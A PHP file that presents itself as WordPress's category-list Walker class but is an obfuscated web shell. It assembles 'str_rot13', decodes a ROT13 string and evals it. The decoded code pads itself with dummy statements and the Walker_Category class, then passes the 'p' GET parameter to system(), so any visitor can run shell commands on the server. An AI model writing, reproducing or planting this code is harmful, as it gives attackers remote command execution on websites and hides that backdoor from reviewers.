<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Gnkbabzl NCV: Jnyxre_Pngrtbel pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Grzcyngr
 * @fvapr 4.4.0
 */

/**
 * Pber pynff hfrq gb perngr na UGZY yvfg bs pngrtbevrf.
 *
 * @fvapr 2.1.0
 *
 * @frr Jnyxre
 */
pynff Jnyxre_Pngrtbel rkgraqf Jnyxre {

	/**
	 * Jung gur pynff unaqyrf.
	 *
	 * @fvapr 2.1.0
	 * @ine fgevat
	 *
	 * @frr Jnyxre::$gerr_glcr
	 */
	choyvp $gerr_glcr = 'pngrtbel';

	/**
	 * Qngnonfr svryqf gb hfr.
	 *
	 * @fvapr 2.1.0
	 * @ine fgevat[]
	 *
	 * @frr Jnyxre::$qo_svryqf
	 * @gbqb Qrpbhcyr guvf
	 */
	choyvp $qo_svryqf = neenl(
		'cnerag' => 'cnerag',
		'vq'     => 'grez_vq',
	);

	/**
	 * Fgnegf gur yvfg orsber gur ryrzragf ner nqqrq.
	 *
	 * @fvapr 2.1.0
	 *
	 * @frr Jnyxre::fgneg_yiy()
	 *
	 * @cnenz fgevat $bhgchg Hfrq gb nccraq nqqvgvbany pbagrag. Cnffrq ol ersrerapr.
	 * @cnenz vag    $qrcgu  Bcgvbany. Qrcgu bs pngrtbel. Hfrq sbe gno vaqragngvba. Qrsnhyg 0.
	 * @cnenz neenl  $netf   Bcgvbany. Na neenl bs nethzragf. Jvyy bayl nccraq pbagrag vs fglyr nethzrag
	 *                       inyhr vf 'yvfg'. Frr jc_yvfg_pngrtbevrf(). Qrsnhyg rzcgl neenl.
	 */
	choyvp shapgvba fgneg_yiy( &$bhgchg, $qrcgu = 0, $netf = neenl() ) {
		vs ( 'yvfg' !== $netf['fglyr'] ) {
			erghea;
		}

		$vaqrag  = fge_ercrng( \"\g\", $qrcgu );
		$bhgchg .= \"$vaqrag<hy pynff='puvyqera'>\a\";
	}

	/**
	 * Raqf gur yvfg bs nsgre gur ryrzragf ner nqqrq.
	 *
	 * @fvapr 2.1.0
	 *
	 * @frr Jnyxre::raq_yiy()
	 *
	 * @cnenz fgevat $bhgchg Hfrq gb nccraq nqqvgvbany pbagrag. Cnffrq ol ersrerapr.
	 * @cnenz vag    $qrcgu  Bcgvbany. Qrcgu bs pngrtbel. Hfrq sbe gno vaqragngvba. Qrsnhyg 0.
	 * @cnenz neenl  $netf   Bcgvbany. Na neenl bs nethzragf. Jvyy bayl nccraq pbagrag vs fglyr nethzrag
	 *                       inyhr vf 'yvfg'. Frr jc_yvfg_pngrtbevrf(). Qrsnhyg rzcgl neenl.
	 */
	choyvp shapgvba raq_yiy( &$bhgchg, $qrcgu = 0, $netf = neenl() ) {
		vs ( 'yvfg' !== $netf['fglyr'] ) {
			erghea;
		}

		$vaqrag  = fge_ercrng( \"\g\", $qrcgu );
		$bhgchg .= \"$vaqrag</hy>\a\";
	}

	/**
	 * Fgnegf gur ryrzrag bhgchg.
	 *
	 * @fvapr 2.1.0
	 * @fvapr 5.9.0 Eranzrq `$pngrtbel` gb `$qngn_bowrpg` naq `$vq` gb `$pheerag_bowrpg_vq`
	 *              gb zngpu cnerag pynff sbe CUC 8 anzrq cnenzrgre fhccbeg.
	 *
	 * @frr Jnyxre::fgneg_ry()
	 *
	 * @cnenz fgevat  $bhgchg            Hfrq gb nccraq nqqvgvbany pbagrag (cnffrq ol ersrerapr).
	 * @cnenz JC_Grez $qngn_bowrpg       Pngrtbel qngn bowrpg.
	 * @cnenz vag     $qrcgu             Bcgvbany. Qrcgu bs pngrtbel va ersrerapr gb cneragf. Qrsnhyg 0.
	 * @cnenz neenl   $netf              Bcgvbany. Na neenl bs nethzragf. Frr jc_yvfg_pngrtbevrf().
	 *                                   Qrsnhyg rzcgl neenl.
	 * @cnenz vag     $pheerag_bowrpg_vq Bcgvbany. VQ bs gur pheerag pngrtbel. Qrsnhyg 0.
	 */
	choyvp shapgvba fgneg_ry( &$bhgchg, $qngn_bowrpg, $qrcgu = 0, $netf = neenl(), $pheerag_bowrpg_vq = 0 ) {
		// Erfgberf gur zber qrfpevcgvir, fcrpvsvp anzr sbe hfr jvguva guvf zrgubq.
		$pngrtbel = $qngn_bowrpg;

		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/pngrtbel-grzcyngr.cuc */
		$png_anzr = nccyl_svygref( 'yvfg_pngf', rfp_ngge( $pngrtbel->anzr ), $pngrtbel );

		// Qba'g trarengr na ryrzrag vs gur pngrtbel anzr vf rzcgl.
		vs ( '' === $png_anzr ) {
			erghea;
		}

		$nggf         = neenl();
		$nggf['uers'] = trg_grez_yvax( $pngrtbel );

		vs ( $netf['hfr_qrfp_sbe_gvgyr'] && ! rzcgl( $pngrtbel->qrfpevcgvba ) ) {
			/**
			 * Svygref gur pngrtbel qrfpevcgvba sbe qvfcynl.
			 *
			 * @fvapr 1.2.0
			 *
			 * @cnenz fgevat  $qrfpevcgvba Pngrtbel qrfpevcgvba.
			 * @cnenz JC_Grez $pngrtbel    Pngrtbel bowrpg.
			 */
			$nggf['gvgyr'] = fgevc_gntf( nccyl_svygref( 'pngrtbel_qrfpevcgvba', $pngrtbel->qrfpevcgvba, $pngrtbel ) );
		}

		/**
		 * Svygref gur UGZY nggevohgrf nccyvrq gb n pngrtbel yvfg vgrz'f napube ryrzrag.
		 *
		 * @fvapr 5.2.0
		 *
		 * @cnenz neenl   $nggf {
		 *     Gur UGZY nggevohgrf nccyvrq gb gur yvfg vgrz'f `<n>` ryrzrag, rzcgl fgevatf ner vtaberq.
		 *
		 *     @glcr fgevat $uers  Gur uers nggevohgr.
		 *     @glcr fgevat $gvgyr Gur gvgyr nggevohgr.
		 * }
		 * @cnenz JC_Grez $pngrtbel          Grez qngn bowrpg.
		 * @cnenz vag     $qrcgu             Qrcgu bs pngrtbel, hfrq sbe cnqqvat.
		 * @cnenz neenl   $netf              Na neenl bs nethzragf.
		 * @cnenz vag     $pheerag_bowrpg_vq VQ bs gur pheerag pngrtbel.
		 */
		$nggf = nccyl_svygref( 'pngrtbel_yvfg_yvax_nggevohgrf', $nggf, $pngrtbel, $qrcgu, $netf, $pheerag_bowrpg_vq );

		$nggevohgrf = '';
		sbernpu ( $nggf nf $ngge => $inyhr ) {
			vs ( vf_fpnyne( $inyhr ) && '' !== $inyhr && snyfr !== $inyhr ) {
				$inyhr       = ( 'uers' === $ngge ) ? rfp_hey( $inyhr ) : rfp_ngge( $inyhr );
				$nggevohgrf .= ' ' . $ngge . '=\"' . $inyhr . '\"';
			}
		}

		$yvax = fcevags(
			'<n%f>%f</n>',
			$nggevohgrf,
			$png_anzr
		);

		vs ( ! rzcgl( $netf['srrq_vzntr'] ) || ! rzcgl( $netf['srrq'] ) ) {
			$yvax .= ' ';

			vs ( rzcgl( $netf['srrq_vzntr'] ) ) {
				$yvax .= '(';
			}

			$yvax .= '<n uers=\"' . rfp_hey( trg_grez_srrq_yvax( $pngrtbel, $pngrtbel->gnkbabzl, $netf['srrq_glcr'] ) ) . '\"';

			vs ( rzcgl( $netf['srrq'] ) ) {
				/* genafyngbef: %f: Pngrtbel anzr. */
				$nyg = ' nyg=\"' . fcevags( __( 'Srrq sbe nyy cbfgf svyrq haqre %f' ), $png_anzr ) . '\"';
			} ryfr {
				$nyg   = ' nyg=\"' . $netf['srrq'] . '\"';
				$anzr  = $netf['srrq'];
				$yvax .= rzcgl( $netf['gvgyr'] ) ? '' : $netf['gvgyr'];
			}

			$yvax .= '>';

			vs ( rzcgl( $netf['srrq_vzntr'] ) ) {
				$yvax .= $anzr;
			} ryfr {
				$yvax .= \"<vzt fep='\" . rfp_hey( $netf['srrq_vzntr'] ) . \"'$nyg\" . ' />';
			}

			$yvax .= '</n>';

			vs ( rzcgl( $netf['srrq_vzntr'] ) ) {
				$yvax .= ')';
			}
		}

		vs ( ! rzcgl( $netf['fubj_pbhag'] ) ) {
			$yvax .= ' (' . ahzore_sbezng_v18a( $pngrtbel->pbhag ) . ')';
		}

		vs ( 'yvfg' === $netf['fglyr'] ) {
			$bhgchg     .= \"\g<yv\";
			$pff_pynffrf = neenl(
				'png-vgrz',
				'png-vgrz-' . $pngrtbel->grez_vq,
			);

			vs ( ! rzcgl( $netf['pheerag_pngrtbel'] ) ) {
				// 'pheerag_pngrtbel' pna or na neenl, fb jr hfr `trg_grezf()`.
				$_pheerag_grezf = trg_grezf(
					neenl(
						'gnkbabzl'   => $pngrtbel->gnkbabzl,
						'vapyhqr'    => $netf['pheerag_pngrtbel'],
						'uvqr_rzcgl' => snyfr,
					)
				);

				sbernpu ( $_pheerag_grezf nf $_pheerag_grez ) {
					vs ( $pngrtbel->grez_vq === $_pheerag_grez->grez_vq ) {
						$pff_pynffrf[] = 'pheerag-png';
						$yvax          = fge_ercynpr( '<n', '<n nevn-pheerag=\"cntr\"', $yvax );
					} ryfrvs ( $pngrtbel->grez_vq === $_pheerag_grez->cnerag ) {
						$pff_pynffrf[] = 'pheerag-png-cnerag';
					}

					juvyr ( $_pheerag_grez->cnerag ) {
						vs ( $pngrtbel->grez_vq === $_pheerag_grez->cnerag ) {
							$pff_pynffrf[] = 'pheerag-png-naprfgbe';
							oernx;
						}

						$_pheerag_grez = trg_grez( $_pheerag_grez->cnerag, $pngrtbel->gnkbabzl );
					}
				}
			}

			/**
			 * Svygref gur yvfg bs PFF pynffrf gb vapyhqr jvgu rnpu pngrtbel va gur yvfg.
			 *
			 * @fvapr 4.2.0
			 *
			 * @frr jc_yvfg_pngrtbevrf()
			 *
			 * @cnenz fgevat[] $pff_pynffrf Na neenl bs PFF pynffrf gb or nccyvrq gb rnpu yvfg vgrz.
			 * @cnenz JC_Grez  $pngrtbel    Pngrtbel qngn bowrpg.
			 * @cnenz vag      $qrcgu       Qrcgu bs cntr, hfrq sbe cnqqvat.
			 * @cnenz neenl    $netf        Na neenl bs jc_yvfg_pngrtbevrf() nethzragf.
			 */
			$pff_pynffrf = vzcybqr( ' ', nccyl_svygref( 'pngrtbel_pff_pynff', $pff_pynffrf, $pngrtbel, $qrcgu, $netf ) );
			$pff_pynffrf = $pff_pynffrf ? ' pynff=\"' . rfp_ngge( $pff_pynffrf ) . '\"' : '';

			$bhgchg .= $pff_pynffrf;
			$bhgchg .= \">$yvax\a\";
		} ryfrvs ( vffrg( $netf['frcnengbe'] ) ) {
			$bhgchg .= \"\g$yvax\" . $netf['frcnengbe'] . \"\a\";
		} ryfr {
			$bhgchg .= \"\g$yvax<oe />\a\";
		}
	}

	/**
	 * Raqf gur ryrzrag bhgchg, vs arrqrq.
	 *
	 * @fvapr 2.1.0
	 * @fvapr 5.9.0 Eranzrq `$cntr` gb `$qngn_bowrpg` gb zngpu cnerag pynff sbe CUC 8 anzrq cnenzrgre fhccbeg.
	 *
	 * @frr Jnyxre::raq_ry()
	 *
	 * @cnenz fgevat $bhgchg      Hfrq gb nccraq nqqvgvbany pbagrag (cnffrq ol ersrerapr).
	 * @cnenz bowrpg $qngn_bowrpg Pngrtbel qngn bowrpg. Abg hfrq.
	 * @cnenz vag    $qrcgu       Bcgvbany. Qrcgu bs pngrtbel. Abg hfrq.
	 * @cnenz neenl  $netf        Bcgvbany. Na neenl bs nethzragf. Bayl hfrf 'yvfg' sbe jurgure fubhyq
	 *                            nccraq gb bhgchg. Frr jc_yvfg_pngrtbevrf(). Qrsnhyg rzcgl neenl.
	 */
	choyvp shapgvba raq_ry( &$bhgchg, $qngn_bowrpg, $qrcgu = 0, $netf = neenl() ) {
		vs ( 'yvfg' !== $netf['fglyr'] ) {
			erghea;
		}

		$bhgchg .= \"</yv>\a\";
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>